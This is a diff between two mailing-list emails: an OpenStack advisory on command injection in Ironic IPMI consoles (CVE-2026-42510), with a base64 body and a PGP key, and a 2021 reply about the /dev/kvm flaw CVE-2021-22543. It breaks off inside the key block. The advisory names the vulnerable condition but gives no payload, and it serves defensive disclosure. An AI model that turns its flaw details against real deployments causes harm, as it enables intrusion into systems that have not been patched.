@@ -1,4 +1,9 @@
-Received: (qmail 13314 invoked by uid 550); 30 Apr 2026 00:59:51 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["10263" "Wednesday" "26" "May" "2021" "17:55:35" "+0200" "Solar Designer" "solar@openwall.com" nil "308" "Re: [oss-security] CVE-2021-22543 - /dev/kvm LPE" nil nil nil "5" nil nil (number mark "U       solar@openwa May 26  308/10263 " thread-indent "\"Re: [oss-security] CVE-2021-22543 - /dev/kvm LPE\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-22543 - /dev/kvm LPE" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 16274 invoked by uid 550); 26 May 2021 15:56:23 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,293 +12,325 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 3326 invoked from network); 30 Apr 2026 00:13:01 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1777507972; x=1778112772; darn=lists.openwall.com;
-        h=autocrypt:subject:from:to:content-language:user-agent:mime-version
-         :date:message-id:from:to:cc:subject:date:message-id:reply-to;
-        bh=kfkf9fD/BO+m+W716xyY3y29dtDznu/lsVSTKTd2UBM=;
-        b=CzOSgucTynj8S4u/DcMMcEFKXRuvLH9UWgI8gdLgY2O00dDCHFDwe3Lspz1Xzip0p2
-         gHwAMO/7u7/CHvQBXr9E8qyKBk1aWB8b0/YEBq8m5i9sO22UDffKkY1VEH1xqHF3HWdX
-         M2Ovr1ivtnu+n53hWDNTYn9z6OQGPBnC97vrcnAAFEIWwVHskdutWTGP5mjiZ3s1JTCX
-         auOA1YA1DprPgehnxJXx1tfT36kllqa44nxWPvL02ibcOlPF2WluLM+zg2mnN6DhlyJL
-         28Jy6Egb/Cgp0JfwlvS27NJsZe8w7z3zXTWLdVAFF2JXw7tslbKYTZ6pnPc6eXRrtS30
-         CH3w==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1777507972; x=1778112772;
-        h=autocrypt:subject:from:to:content-language:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=kfkf9fD/BO+m+W716xyY3y29dtDznu/lsVSTKTd2UBM=;
-        b=fvWSAJQ+J2ngCObS2QQuucTbReMnDYKUguyNn1fanjuBHc/Rd4t5VOTpRZWC+/ThOl
-         t8t2wwDydfjUrFjDORpn0f5WxttqeWtxg2yjkTLwD5yQdq9Jja19I1iwxbQYcxrlWnFn
-         z6D2zQb0Nl1n6b+tApNBCTAtN7I3BDeI9lmi8mMYamgqqW106nN2zjPyjo0ZMIqo5Sln
-         P4vkyOC4FCAVrV/E4mp6BAsGrNGyJUNGyld5mwqSw4i9z8IfiSMrbLd71lGQzthXDIme
-         oB3UzyKL8Wv3ZQwrBRPFrP/GSBeqeL0rB2d3zDot3jGdH12Sf158cTzxR4kgWl6NbSIZ
-         4rbw==
-X-Gm-Message-State: AOJu0YyF/PNBBn6448TTmrkadztTRWCo+7jZfvJVqSwmmcCLsNyBsOEC
-	sYmkm+UXzLBerCtVm8geHaKt8/Z5N5DiJN0+vbV8hqT4o40r/uw5gHagfdxyUz0l
-X-Gm-Gg: AeBDietLjlmpVYet1mYKDd6yQE+3jatCYk3XWedBIyGESSsNqi6n0pvTQVDMUQu7OX8
-	FAlMVGlWtU6p1xITUGopzy3HhsrX1+gUIBv3E/pBn/15UzGowm3VzKEpq16jRS5aC+MFutHYpik
-	WA/L/OnRzJAGdBrlvZ53mHjwFyVeeeVUoR79JJNfC77smECg+kw8c62oGkV77dWirhyy103QSQU
-	ZqQidtTIz8xfIZ9eT09CKtFy8rGe2V3EPTiFV+2h9L/PgnHUFUynBj9GfGxHP8ktN2RVjU+HGX9
-	wT14l5Qvnbnub2qJxfdAgQLVGj2X6QODk913mcUuEZwSJFpSc9ULhVguaeW9ZLsLIAjvfvZPhOV
-	afyh+VCzcnq1wTjvaijEQCb3qv6uZTRJEfFdGkDJfFje+sPStKR4d1YsMunZ94pe1Dkr/Tm4olX
-	GqQgwFG5pHjDQgC8awgJsP4gDFZR0/ufDVC6sR1g3MObLAAxHOXpgT+H/roih40hjGsXgxCER95
-	5p2JSHo7WYInSoo+9PQ
-X-Received: by 2002:a05:6a20:3944:b0:39b:81bf:15ed with SMTP id adf61e73a8af0-3a3cf951304mr614296637.52.1777507971386;
-        Wed, 29 Apr 2026 17:12:51 -0700 (PDT)
-Message-ID: <0c6e9ffe-f3da-47dd-9d53-d0dcdb4c435d@gmail.com>
-Date: Wed, 29 Apr 2026 17:12:49 -0700
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: oss-security@lists.openwall.com
-From: Goutham Pacha Ravi <gouthampravi@gmail.com>
-In-Reply-To: <9ca6dc44-f9a3-4700-be42-eac488a6c61c@jvf.cc>
-Autocrypt: addr=gouthampravi@gmail.com; keydata=
- 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
- VYvdtAgTRIrQIz/K
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="------------R0TBf6cHoSqm0g5jwkT0kirP"
-Subject: [oss-security] OSSA-2026-008: OpenStack Ironic: Command Injection in Ironic IPMI
- Console Implementations (CVE-2026-42510) - errata 1
+Received: (qmail 16055 invoked from network); 26 May 2021 15:55:51 -0000
+Date: Wed, 26 May 2021 17:55:35 +0200
+From: Solar Designer <solar@openwall.com>
+To: "Eduardo' Vela <Nava>" <evn@google.com>
+Cc: oss-security@lists.openwall.com, Paolo Bonzini <pbonzini@redhat.com>
+Message-ID: <20210526155535.GA26800@openwall.com>
+References: <CAFswPa_QOAgf6wgng+KJcPJKykNG3zQWyQfiXWHj8VK0W+_tKg@mail.gmail.com>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="0OAP2g/MAC+5xKAE"
+Content-Disposition: inline
+In-Reply-To: <CAFswPa_QOAgf6wgng+KJcPJKykNG3zQWyQfiXWHj8VK0W+_tKg@mail.gmail.com>
+User-Agent: Mutt/1.4.2.3i
+Subject: Re: [oss-security] CVE-2021-22543 - /dev/kvm LPE
 
---------------R0TBf6cHoSqm0g5jwkT0kirP
-Content-Type: multipart/mixed; boundary="------------6DpBeX31smAQ8S7I4TOXPCVx";
- protected-headers="v1"; hp="clear"
-Message-ID: <0c6e9ffe-f3da-47dd-9d53-d0dcdb4c435d@gmail.com>
-Date: Wed, 29 Apr 2026 17:12:49 -0700
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: oss-security@lists.openwall.com
-From: Goutham Pacha Ravi <gouthampravi@gmail.com>
-Subject: OSSA-2026-008: OpenStack Ironic: Command Injection in Ironic IPMI
- Console Implementations (CVE-2026-42510) - errata 1
-Autocrypt: addr=gouthampravi@gmail.com; keydata=
- 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
- VYvdtAgTRIrQIz/K
+--0OAP2g/MAC+5xKAE
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
---------------6DpBeX31smAQ8S7I4TOXPCVx
-Content-Type: multipart/mixed; boundary="------------YOcaV5SdIsbPgtz60RrUDJOU"
+Hi,
 
---------------YOcaV5SdIsbPgtz60RrUDJOU
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: base64
+On Wed, May 26, 2021 at 03:48:22PM +0200, Eduardo' Vela <Nava> wrote:
+> I believe this still doesn't have a patch, but +Paolo Bonzini
+> <pbonzini@redhat.com> has been working on one for some time now.
+> 
+> Please use CVE-2021-22543 to refer to this issue.
+> 
+> Advisory:
+> https://github.com/google/security-research/security/advisories/GHSA-7wq5-phmq-m584
 
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT0NCk9TU0EtMjAyNi0wMDg6IENvbW1hbmQgSW5qZWN0aW9uIGluIElyb25p
-YyBJUE1JIENvbnNvbGUgSW1wbGVtZW50YXRpb25zDQo9PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQo6RGF0ZTog
-QXByaWwgMjcsIDIwMjYNCjpDVkU6IENWRS0yMDI2LTQyNTEwDQoNCg0KQWZmZWN0cw0Kfn5+fn5+
-fg0KLSBJcm9uaWM6ID49NC4zLjAgPDI2LjEuNiwgPj0yNy4wLjAgPDI5LjAuNSwgPj0zMC4wLjAg
-PDMyLjAuMSwgPj0zMy4wLjAgDQo8MzUuMC4xDQoNCg0KRGVzY3JpcHRpb24NCn5+fn5+fn5+fn5+
-DQpEbWl0cnkgVGFudHN1ciBhbmQgVHVvbW8gVGFuc2thbmVuIGZyb20gdGhlIE1ldGFsMy5pbyBT
-ZWN1cml0eSBUZWFtIA0KcmVwb3J0ZWQgYSB2dWxuZXJhYmlsaXR5IGluIElyb25pYydzIElQTUkg
-Y29uc29sZSBiYWNrZW5kcy4gQSBwcm9qZWN0IA0KbWFuYWdlciBmb3IgdGhlIHByb2plY3QgbWFy
-a2VkIGFzIGEgYGBub2RlLm93bmVyYGAgY2FuIGluamVjdCBhcmJpdHJhcnkgDQpjb21tYW5kcyB3
-aGljaCBhIGNvbmR1Y3RvciBleGVjdXRlcyBvbiBjb25zb2xlIGFjdGl2YXRpb24uDQpObyBjb25z
-b2xlIGJhY2tlbmRzIGFyZSBlbmFibGVkIGJ5IGRlZmF1bHQgaW4gSXJvbmljLiBPbmx5IGluc3Rh
-bGxhdGlvbnMgDQp3aGljaCBoYXZlIHNldCBgYFtjb25kdWN0b3JdL2VuYWJsZWRfY29uc29sZV9p
-bnRlcmZhY2VzYGAgdG8gZW5hYmxlIA0KZWl0aGVyIGBgaXBtaXRvb2wtc2hlbGxpbmFib3hgYCBv
-ciBgYGlwbWl0b29sLXNvY2F0YGAgYXJlIHZ1bG5lcmFibGUuDQoNCg0KDQpFcnJhdGENCn5+fn5+
-fg0KV2hlbiB0aGUgb3JpZ2luYWwgYWR2aXNvcnkgd2FzIHB1Ymxpc2hlZCBhIENWRSBudW1iZXIg
-d2FzIG5vdCBhc3NpZ25lZC4gDQpDVkUtMjAyNi00MjUxMCB3YXMgYXNzaWduZWQgb24gMjAyNi0w
-NC0yOS4NCg0KDQpQYXRjaGVzDQp+fn5+fn5+DQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3Jn
-L2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk4NjQxOCANCigyMDIzLjEvYW50ZWxvcGUgKHVubWFpbnRh
-aW5lZCkpDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8r
-Lzk4NjQxNyAoMjAyNC4xL2NhcmFjYWwgDQoodW5tYWludGFpbmVkKSkNCi0gaHR0cHM6Ly9yZXZp
-ZXcub3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTg2MzYzICgyMDI0LjIvZGFsbWF0
-aWFuKQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy9jL29wZW5zdGFjay9pcm9uaWMvKy85
-ODYzNjIgKDIwMjUuMS9lcG94eSkNCi0gaHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvYy9vcGVu
-c3RhY2svaXJvbmljLysvOTg2MzYxICgyMDI1LjIvZmxhbWluZ28pDQotIGh0dHBzOi8vcmV2aWV3
-Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk4NjIzNSAoMjAyNi4xL2dhenBhY2hv
-KQ0KDQoNCkNyZWRpdHMNCn5+fn5+fn4NCi0gRG1pdHJ5IFRhbnRzdXIgZnJvbSBNZXRhbDMuaW8g
-U2VjdXJpdHkgVGVhbQ0KLSBUdW9tbyBUYW5za2FuZW4gZnJvbSBNZXRhbDMuaW8gU2VjdXJpdHkg
-VGVhbQ0KDQoNClJlZmVyZW5jZXMNCn5+fn5+fn5+fn4NCi0gaHR0cHM6Ly9sYXVuY2hwYWQubmV0
-L2J1Z3MvMjE0ODMzMQ0KLSBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dp
-P25hbWU9Q1ZFLTIwMjYtNDI1MTANCg0KDQpOb3Rlcw0Kfn5+fn4NCi0gQSBDVkUgcmVxdWVzdCB3
-YXMgZmlsZWQgd2l0aCBNSVRSRSBvbiAyMDI2LTA0LTI3Lg0KLSBQYXRjaGVzIGZvciB1bm1haW50
-YWluZWQgYnJhbmNoZXMgYXJlIHByb3ZpZGVkIGFzIGEgY291cnRlc3kuDQotIFRoZSBgYGlwbWl0
-b29sLXNoZWxsaW5hYm94YGAgY29uc29sZSBpbnRlcmZhY2UgaXMgYWxyZWFkeSBzY2hlZHVsZWQN
-CiAgIGZvciByZW1vdmFsIGZyb20gSXJvbmljIGZvciBsYWNrIG9mIHNlY3VyaXR5IHN1cHBvcnQg
-Zm9yIHNoZWxsaW5hYm94Lg0KICAgU2VjdXJpdHkgc2Vuc2l0aXZlIG9wZXJhdG9ycyBhcmUgc3Ry
-b25nbHkgZW5jb3VyYWdlZCB0byBzdG9wIHVzZSBvZg0KICAgdGhpcyBjb25zb2xlIGludGVyZmFj
-ZSBpbW1lZGlhdGVseS4NCg0KDQpPU1NBIEhpc3RvcnkNCn5+fn5+fn5+fn5+fg0KLSAyMDI2LTA0
-LTI5IC0gRXJyYXRhIDENCi0gMjAyNi0wNC0yNyAtIE9yaWdpbmFsIFZlcnNpb24NCg0KDQotLQ0K
-R291dGhhbSBQYWNoYSBSYXZpDQpPcGVuU3RhY2sgVnVsbmVyYWJpbGl0eSBNYW5hZ2VtZW50IFRl
-YW0NCmh0dHBzOi8vc2VjdXJpdHkub3BlbnN0YWNrLm9yZy92bXQuaHRtbA0K
+To comply with the no link-only postings policy we have here, attached
+is a text export of the above web page, for archival.
 
---------------YOcaV5SdIsbPgtz60RrUDJOU
-Content-Type: application/pgp-keys; name="OpenPGP_0x0638DAD3B82C3988.asc"
-Content-Disposition: attachment; filename="OpenPGP_0x0638DAD3B82C3988.asc"
-Content-Description: OpenPGP public key
-Content-Transfer-Encoding: quoted-printable
+Alexander
 
------BEGIN PGP PUBLIC KEY BLOCK-----=0A=
-=0A=
-xsFNBGm7HhsBEAC4jWG7snWqax8fazd7QVADjLRxhNKOAyVrBqBffI5CuSuafwtq=0A=
-V1s3x8C7GzNjklTuCXcX7iZAU7g5y0fZtT6lp1l3l1xUtKPcBF0DCd5JH/HP/MH8=0A=
-eBByL3sNRR3RHovAVpUhxT0RGcltm5wbnwE37dcrIRbVl66xbcyaUnHokUhdShSb=0A=
-SptiPPOkncn/i10uGAIHN884Bt/zZkUpak9PMTFNXThDYU+79csw6roxH/AV6mtD=0A=
-xDG6wKf8VcFg538a8deJsPUNONrdOYwjH4xAYao5yrktALQC2zEbHLmNZnFRHJ6z=0A=
-Gs7zOGN6kLV6ueqfzkkWjPGXkcCeIL4mX3K9mRaW0L6QwKh0n2grWs264dD5bV/r=0A=
-PIxhRDHNfp5rMBRPb3rStEqDkqZ8MMuCETZQUwQYa9vccj7diXOa+YvWehaE4Ito=0A=
-Nd6+PD9I6mB0VwVDpdxmwgEqR+wG30OTaPSfyq4GQ3z/A783Wyx9vuSI4R2iRSSg=0A=
-HuyiaFnRZMIOu5ib0dTuY+/MBmMxSpcU+tre+DedXmCNksLfD9HsHyJMx/OGTWYQ=0A=
-dYmavnRtBN+dzwku9SrisCMfAOuDvTvri4csxTRfomNYhUWODGqWum/sV253lh5q=0A=
-5J/H6xHVhANTQ3vVU1EYGBJszPxx+aTlFye9oo1/06Lv+U3nYdNDMzaYNwARAQAB=0A=
-zStHb3V0aGFtIFBhY2hhIFJhdmkgPGdvdXRoYW1wcmF2aUBnbWFpbC5jb20+wsGz=0A=
-BBMBCABdFiEEwo5Vl+U+phfaPpN5Bjja07gsOYgFAmm7HhsbFIAAAAAABAAObWFu=0A=
-dTIsMi41KzEuMTIsMCwzAhsDBQkDwmcABQsJCAcCAiICBhUKCQgLAgQWAgMBAh4H=0A=
-AheAAAoJEAY42tO4LDmIhTwQAKt30GA/0UnV9uvioUeyBJp1GnGN1lcXNQYIFOB+=0A=
-TbjMthdYScRTHY28l/gKSuvTtV+DuTvrOS0UPZ7HC72SijE3AJOQGE1YMTToxdxi=0A=
-OCv++R/3Sth4zogHPVlJPn4mIry/8OX7cchxnwuPGtdrH2H31IxSIeW2FWSSGd7K=0A=
-rY/IncJOQeN4wOXpEi+gbNGGrnyEJj3J0pz+8Fx2MugdMGP7zmLMN8UEIY7XBGx6=0A=
-U96ri35iCMsosdiuUylUXTDufJf+VvA66gGNy063KM8mzkdJHTVzdcJjFTS4FemF=0A=
-97dBu2FR8sgsiiaFiNVs1KfHKcs2J2M+rVQQokpYARq7ayDLPPhVHV4bXk1kuS4p=0A=
-l6EeSGz0Xp6LXD6YuwcG87vUDD6IJDQY2YqRedYkaOF0hvwuIihDMwWBtuRLNdgl=0A=
-MNGFnf++euaQBqfQT9W6mQqFGQ+hkLsTPo/nYjfVIcYRdGZEY+iydM3HaVr8UbB8=0A=
